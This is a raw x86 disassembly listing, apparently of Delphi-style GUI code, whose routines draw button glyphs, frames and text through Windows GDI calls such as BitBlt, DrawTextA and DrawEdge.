mov ecx [ eax ]
call [ ecx + 0x8 ]
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test eax eax
jle r-xdata
mov eax ebx
call sub_422594
mov [ esi + 0x1c ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
pop edx
xchg edx eax
mov ecx edx
cdq
idiv ecx
test edx edx
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
pop edx
xchg edx eax
mov ecx edx
cdq
idiv ecx
cmp eax 0x4
jle r-xdata
mov edx eax
mov eax esi
call sub_42c818
mov eax 0x1
sub_42c818
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x20 ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
jbe r-xdata
mov eax esi
call sub_42c72c
mov [ esi + 0x20 ] bl
mov edx [ esi + 0x4 ]
mov eax esi
call sub_42c770
sub_42c840
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x2
jne r-xdata
xor eax eax
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov ebx [ edx + eax * 4 + 0xc ]
cmp ebx 0xffffffff
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x3
jae r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
or esi eax
je r-xdata
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x20 ]
mov ecx edx
cdq
idiv ecx
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov esi eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_421ee0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_42cdef
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx edi
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx esi
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
push esi
lea eax [ ebp - 0x28 ]
push eax
mov ecx edi
xor edx edx
xor eax eax
call sub_412be0
mov eax [ ebp - 0xc ]
call sub_4224a8
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_41d618
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
call sub_421c70
mov edx eax
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov bl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x20 ]
jl r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push esi
lea eax [ ebp - 0x38 ]
push eax
xor ecx ecx
mov cl bl
inc ecx
imul ecx edi
xor eax eax
mov al bl
imul edi
xor edx edx
call sub_412be0
mov al [ ebp - 0x5 ]
sub al 0x1
jb r-xdata
xor ebx ebx
mov ecx esi
mov edx edi
mov eax [ rw-data ]
call sub_42c5ac
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42c538
mov [ rw-data ] eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4224a8
push eax
mov eax [ ebp - 0xc ]
call sub_4224a8
lea edx [ ebp - 0x28 ]
pop ecx
call sub_41d888
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x38 ] 0x1
jne r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov ecx 0x20000000
mov edx [ ebp - 0xc ]
call sub_42c4dc
xor edx edx
mov dl [ ebp - 0x5 ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + edx * 4 + 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x1c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xc ]
call sub_42c4dc
xor edx edx
mov dl [ ebp - 0x5 ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + edx * 4 + 0xc ] eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_42cdb3
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_421ee0
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_421ee0
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x1
jbe r-xdata
dec eax
sub al 0x2
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403198
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x14 ]
call sub_4224a8
mov eax [ eax + 0x14 ]
xor edx edx
call sub_41d618
mov edx edi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x14 ]
call sub_422564
test al al
je r-xdata
mov eax [ ebp - 0xc ]
call sub_4224a8
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_4224a8
mov ecx eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
call sub_41d888
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_423278
mov edx edi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x10 ]
call sub_4224a8
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_41d618
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_4224a8
push eax
mov eax [ ebp - 0x14 ]
call sub_4224a8
lea edx [ ebp - 0x28 ]
pop ecx
call sub_41d888
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x14 ]
mov edx 0xff000014
call sub_41d618
mov eax [ ebp - 0x18 ]
call sub_41dd60
mov ebx eax
push 0x0
push ebx
call SetTextColor
push 0xffffff
push ebx
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_4224a8
call sub_41dd60
push eax
push esi
push edi
push 0x0
push 0x0
push ebx
call BitBlt
mov eax [ ebp - 0x10 ]
call sub_4224a8
mov eax [ eax + 0x14 ]
mov edx 0x808080
call sub_41d618
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_4224a8
push eax
mov eax [ ebp - 0x14 ]
call sub_4224a8
lea edx [ ebp - 0x28 ]
pop ecx
call sub_41d888
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x14 ]
mov edx 0xff000010
call sub_41d618
mov eax [ ebp - 0x18 ]
call sub_41dd60
mov ebx eax
push 0x0
push ebx
call SetTextColor
push 0xffffff
push ebx
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_4224a8
call sub_41dd60
push eax
push esi
push edi
push 0x0
push 0x0
push ebx
call BitBlt
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_41c964
push eax
mov eax [ ebp - 0x10 ]
call sub_4224a8
mov eax [ eax + 0x14 ]
pop edx
call sub_41d618
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_4224a8
push eax
mov eax [ ebp - 0x14 ]
call sub_4224a8
lea edx [ ebp - 0x28 ]
pop ecx
call sub_41d888
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_41d618
mov eax [ ebp - 0x18 ]
call sub_41dd60
mov ebx eax
push 0x0
push ebx
call SetTextColor
push 0xffffff
push ebx
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_4224a8
call sub_41dd60
push eax
push esi
push edi
push 0x0
push 0x0
push ebx
call BitBlt
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_423278
mov eax [ ebp - 0xc ]
call sub_4224a8
mov ebx eax
mov eax [ ebx + 0x14 ]
mov edx 0xff00000f
call sub_41d618
lea edx [ ebp - 0x28 ]
mov eax ebx
call sub_41d9bc
mov eax [ ebx + 0x14 ]
mov edx 0xff000014
call sub_41d618
push 0x0
mov eax ebx
call sub_41dd60
push eax
call SetTextColor
push 0xffffff
mov eax ebx
call sub_41dd60
push eax
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_4224a8
call sub_41dd60
push eax
push esi
push edi
push 0x1
push 0x1
mov eax ebx
call sub_41dd60
push eax
call BitBlt
mov eax [ ebx + 0x14 ]
mov edx 0xff000010
call sub_41d618
push 0x0
mov eax ebx
call sub_41dd60
push eax
call SetTextColor
push 0xffffff
mov eax ebx
call sub_41dd60
push eax
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_4224a8
call sub_41dd60
push eax
push esi
push edi
push 0x0
push 0x0
mov eax ebx
call sub_41dd60
push eax
call BitBlt
mov eax [ ebp - 0x14 ]
call sub_4224a8
mov eax [ eax + 0xc ]
mov edx 0xffffff
call sub_41ce24
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_423278
mov eax [ ebp - 0x14 ]
call sub_4224a8
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_41d618
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_403198
mov eax [ ebp - 0x14 ]
call sub_403198
retn
sub_42ce18
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov ebx [ ebp + 0xc ]
cmp [ edi + 0x4 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ edi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
test eax eax
je r-xdata
mov eax [ edi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
test eax eax
je r-xdata
mov edx ebx
mov eax edi
call sub_42c840
mov esi eax
call sub_42f57c
call sub_42f65c
test al al
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
mov [ ebp - 0x24 ] edx
mov edx [ eax + 0x4 ]
mov [ ebp - 0x20 ] edx
mov eax [ edi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
xor edx edx
mov dl [ edi + 0x20 ]
mov ecx edx
cdq
idiv ecx
add eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ edi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
add eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
dec bl
je r-xdata
push 0x1
push 0x1fffffff
push 0x1fffffff
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp - 0x4 ]
call sub_41dd60
push eax
push esi
mov eax [ edi + 0x8 ]
call sub_447890
push eax
call ImageList_DrawEx
jmp r-xdata
cmp bl 0x3
jne r-xdata
mov bl 0x5
jmp r-xdata
dec ebx
sub bl 0x2
jb r-xdata
push 0x0
push 0x1fffffff
mov eax 0xff00000f
call sub_41c964
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp - 0x4 ]
call sub_41dd60
push eax
push esi
mov eax [ edi + 0x8 ]
call sub_447890
push eax
call ImageList_DrawEx
call sub_42f57c
lea ecx [ ebp - 0x14 ]
mov edx ebx
call sub_42f8c0
lea eax [ ebp - 0x24 ]
push eax
mov eax [ edi + 0x8 ]
call sub_447890
push eax
push esi
mov eax [ ebp - 0x4 ]
call sub_41dd60
push eax
call sub_42f57c
lea ecx [ ebp - 0x14 ]
pop edx
call sub_42f7ac
jmp r-xdata
mov bl 0x4
jmp r-xdata
jmp r-xdata
mov bl 0x2
sub_42cf7c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov ebx edx
mov edi [ ebp + 0x8 ]
mov dl 0x1
mov eax [ ebx + 0x14 ]
call sub_41d734
cmp [ ebp + 0xc ] 0x1
jne r-xdata
or edi 0x5
push edi
lea eax [ ebp - 0x10 ]
push eax
mov eax esi
call sub_4041a8
push eax
mov eax esi
call sub_4043a8
push eax
mov eax ebx
call sub_41dd60
push eax
call DrawTextA
push 0x1
push 0x1
lea eax [ ebp - 0x10 ]
push eax
call OffsetRect
mov edx 0xff000014
mov eax [ ebx + 0xc ]
call sub_41ce24
mov eax edi
or eax 0x5
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax esi
call sub_4041a8
push eax
mov eax esi
call sub_4043a8
push eax
mov eax ebx
call sub_41dd60
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
call OffsetRect
mov edx 0xff000010
mov eax [ ebx + 0xc ]
call sub_41ce24
or edi 0x5
push edi
lea eax [ ebp - 0x10 ]
push eax
mov eax esi
call sub_4041a8
push eax
mov eax esi
call sub_4043a8
push eax
mov eax ebx
call sub_41dd60
push eax
call DrawTextA
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_42d05c
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
and eax 0x2
cmp eax 0x2
jne r-xdata
mov edx [ ebx + 0xc ]
sub edx [ ebx + 0x4 ]
mov eax [ ebx + 0x8 ]
sub eax [ ebx ]
lea ecx [ ebp - 0x18 ]
call sub_412bb8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
lea ecx [ ebp - 0x20 ]
xor edx edx
xor eax eax
call sub_412bb8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x20 ]
mov ecx edx
cdq
idiv ecx
lea ecx [ ebp - 0x20 ]
pop edx
call sub_412bb8
jmp r-xdata
cmp [ ebp + 0x1c ] 0x1
jne r-xdata
mov [ ebp + 0x1c ] 0x1
jmp r-xdata
push 0x0
lea eax [ ebp - 0x40 ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_412be0
push esi
push edi
lea esi [ ebp - 0x40 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
lea ecx [ ebp - 0x28 ]
xor edx edx
xor eax eax
call sub_412bb8
push 0x0
lea eax [ ebp - 0x40 ]
push eax
mov ecx [ ebx + 0x8 ]
sub ecx [ ebx ]
xor edx edx
xor eax eax
call sub_412be0
push esi
push edi
lea esi [ ebp - 0x40 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov eax [ ebp + 0x8 ]
or eax 0x400
push eax
push edi
mov eax [ ebp + 0x20 ]
call sub_4041a8
push eax
mov eax [ ebp + 0x20 ]
call sub_4043a8
push eax
mov eax [ ebp - 0x8 ]
call sub_41dd60
push eax
call DrawTextA
mov edx [ edi + 0xc ]
sub edx [ edi + 0x4 ]
mov eax [ edi + 0x8 ]
sub eax [ edi ]
lea ecx [ ebp - 0x28 ]
call sub_412bb8
jmp r-xdata
mov eax [ ebp + 0x20 ]
call sub_4041a8
test eax eax
jle r-xdata
mov [ ebp + 0x1c ] 0x0
mov eax [ ebp - 0x18 ]
mov edx eax
sub edx [ ebp - 0x20 ]
inc edx
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x14 ]
mov edx eax
sub edx [ ebp - 0x1c ]
inc edx
sar edx 0x1
jns r-xdata
mov al [ ebp + 0x1c ]
sub al 0x2
jae r-xdata
mov [ esi ] edx
sub eax [ ebp - 0x28 ]
inc eax
sar eax 0x1
jns r-xdata
adc edx 0x0
mov [ esi + 0x4 ] edx
sub eax [ ebp - 0x24 ]
inc eax
sar eax 0x1
jns r-xdata
adc edx 0x0
mov [ ebp - 0x10 ] eax
adc eax 0x0
mov [ ebp - 0xc ] eax
jmp r-xdata
adc eax 0x0
xor eax eax
mov [ ebp + 0x14 ] eax
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
cmp [ ebp - 0x28 ] 0x0
je r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
cmp [ ebp + 0x18 ] 0xffffffff
jne r-xdata
mov al [ ebp + 0x1c ]
sub al 0x1
jb r-xdata
mov eax [ ebp + 0x18 ]
add eax [ ebp - 0x1c ]
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x18 ]
add eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x18 ]
pop ecx
sub eax ecx
lea ecx [ ebp - 0x30 ]
call sub_412bb8
mov al [ ebp + 0x1c ]
sub al 0x2
jae r-xdata
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x1c ]
add edx [ ebp + 0x14 ]
add edx [ ebp - 0x24 ]
mov eax [ ebp - 0x20 ]
add eax [ ebp + 0x14 ]
add eax [ ebp - 0x28 ]
call sub_412bb8
mov al [ ebp + 0x1c ]
sub al 0x2
jae r-xdata
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x1c ]
add edx [ ebp - 0x24 ]
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x28 ]
call sub_412bb8
mov al [ ebp + 0x1c ]
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x18 ]
mov [ esi ] eax
add eax [ ebp - 0x20 ]
add eax [ ebp + 0x14 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x2c ]
sub eax [ ebp - 0x24 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x30 ]
sub eax [ ebp - 0x28 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x2c ]
inc eax
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x30 ]
inc eax
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x2c ]
mov ecx 0x3
cdq
idiv ecx
mov [ ebp + 0x18 ] eax
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x30 ]
mov ecx 0x3
cdq
idiv ecx
mov [ ebp + 0x18 ] eax
jmp r-xdata
mov eax [ ebx ]
mov edx [ ebp + 0x24 ]
add eax [ edx ]
add [ esi ] eax
mov eax [ ebx + 0x4 ]
mov edx [ ebp + 0x24 ]
add eax [ edx + 0x4 ]
add [ esi + 0x4 ] eax
call sub_42f57c
call sub_42f65c
test al al
je r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp + 0x18 ]
sub eax [ ebp - 0x20 ]
mov [ esi ] eax
sub eax [ ebp + 0x14 ]
sub eax [ ebp - 0x28 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
dec al
je r-xdata
mov [ ebp + 0x14 ] eax
adc eax 0x0
mov [ ebp + 0x14 ] eax
jmp r-xdata
adc eax 0x0
mov [ ebp + 0x18 ] eax
jmp r-xdata
adc eax 0x0
mov [ ebp + 0x18 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x18 ]
mov [ ebp + 0x14 ] eax
jmp r-xdata
mov eax [ ebx + 0x4 ]
add eax [ ebp - 0xc ]
mov edx [ ebp + 0x24 ]
add eax [ edx + 0x4 ]
push eax
mov eax [ ebx ]
add eax [ ebp - 0x10 ]
mov edx [ ebp + 0x24 ]
add eax [ edx ]
push eax
push edi
call OffsetRect
mov eax [ ebx + 0x4 ]
add eax [ ebp - 0xc ]
push eax
mov eax [ ebx ]
add eax [ ebp - 0x10 ]
push eax
push edi
call OffsetRect
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov [ esi + 0x4 ] eax
add eax [ ebp - 0x1c ]
add eax [ ebp + 0x14 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x20
mov eax [ ebp - 0x14 ]
sub eax [ ebp + 0x18 ]
sub eax [ ebp - 0x1c ]
mov [ esi + 0x4 ] eax
sub eax [ ebp + 0x14 ]
sub eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
sub_42d388
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x24 ]
mov eax [ ebp + 0x28 ]
push eax
push edi
mov al [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x18 ]
push eax
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_42d05c
mov al [ ebp + 0x14 ]
push eax
mov al [ ebp + 0x10 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax ebx
call sub_42ce18
mov eax [ ebp + 0x8 ]
push eax
mov al [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_42cf7c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x24
sub_42d3f8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4392b4
mov eax esi
mov edx [ r-xdata ]
call sub_403348
mov [ ebx + 0x20 ] eax
pop esi
pop ebx
retn
sub_42d41c
push ebx
mov ebx eax
mov eax ebx
call sub_446ab4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x20 ]
cmp [ eax + 0x168 ] 0x0
je r-xdata
mov eax [ ebx + 0x20 ]
cmp [ eax + 0x172 ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403348
mov al [ eax + 0x69 ]
mov edx [ ebx + 0x20 ]
cmp al [ edx + 0x170 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_42d468
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x20 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403348
mov eax [ eax + 0x6c ]
cmp eax [ esi + 0x168 ]
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_42d498
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x20 ]
call sub_42dd48
sub_42d4b8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x20 ]
call sub_42ddd4
sub_42d4d8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42c63c
mov [ ebx + 0x16c ] eax
mov eax [ ebx + 0x16c ]
mov [ eax + 0x2c ] ebx
mov [ eax + 0x28 ] sub_42dd08
mov ecx esi
xor edx edx
mov eax ebx
call sub_441eec
push 0x17
push 0x16
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x84 ]
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax ebx
call sub_43a69c
mov edx 0xff00000f
mov eax ebx
call sub_43a710
mov [ ebx + 0x174 ] 0x4
mov [ ebx + 0x17c ] 0xffffffff
mov [ ebx + 0x173 ] 0x0
mov [ ebx + 0x178 ] 0x1
inc [ rw-data ]
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_42d598
push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
dec [ rw-data ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_441f48
mov eax [ esi + 0x16c ]
call sub_403198
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_42d5d0
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x40 ] edx
mov [ ebp - 0x3c ] edx
mov esi eax
xor eax eax
push ebp
push sub_42d9fa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
cmp [ esi + 0x182 ] 0x1
jne r-xdata
mov [ esi + 0x182 ] 0x1
mov [ esi + 0x171 ] 0x0
jmp r-xdata
mov edx [ esi + 0x68 ]
mov eax [ esi + 0x160 ]
call sub_41dc80
call sub_42f57c
call sub_42f65c
test al al
je r-xdata
cmp [ esi + 0x170 ] 0x0
je r-xdata
mov eax [ esi + 0x4c ]
push eax
lea eax [ ebp - 0x19 ]
push eax
mov ecx [ esi + 0x48 ]
xor edx edx
xor eax eax
call sub_412be0
cmp [ esi + 0x180 ] 0x0
jne r-xdata
mov eax [ esi + 0x160 ]
call sub_41dd60
mov edx eax
mov eax esi
call sub_4376c4
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov [ esi + 0x182 ] 0x0
cmp [ esi + 0x168 ] 0x0
je r-xdata
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
jb r-xdata
mov ebx 0x2010
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
jae r-xdata
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
jae r-xdata
mov [ ebp - 0x9 ] 0x5
jmp r-xdata
mov [ esi + 0x182 ] 0x3
jmp r-xdata
xor eax eax
mov al [ esi + 0x178 ]
mov eax [ eax * 4 + rw-data ]
or eax 0xf
push eax
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
setb al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
push eax
lea eax [ ebp - 0x19 ]
push eax
mov eax [ esi + 0x160 ]
call sub_41dd60
push eax
call DrawEdge
jmp r-xdata
cmp [ esi + 0x181 ] 0x0
je r-xdata
push ebx
push 0x4
lea eax [ ebp - 0x19 ]
push eax
mov eax [ esi + 0x160 ]
call sub_41dd60
push eax
call DrawFrameControl
jmp r-xdata
or ebx 0x200
cmp [ esi + 0x181 ] 0x0
je r-xdata
mov [ ebp - 0x9 ] 0x4
jmp r-xdata
xor ebx ebx
cmp [ esi + 0x180 ] 0x0
je r-xdata
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x19 ]
push eax
call InflateRect
test [ esi + 0x1c ] 0x10
je r-xdata
cmp [ esi + 0x182 ] 0x1
jne r-xdata
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
jae r-xdata
mov [ ebp - 0x9 ] 0x2
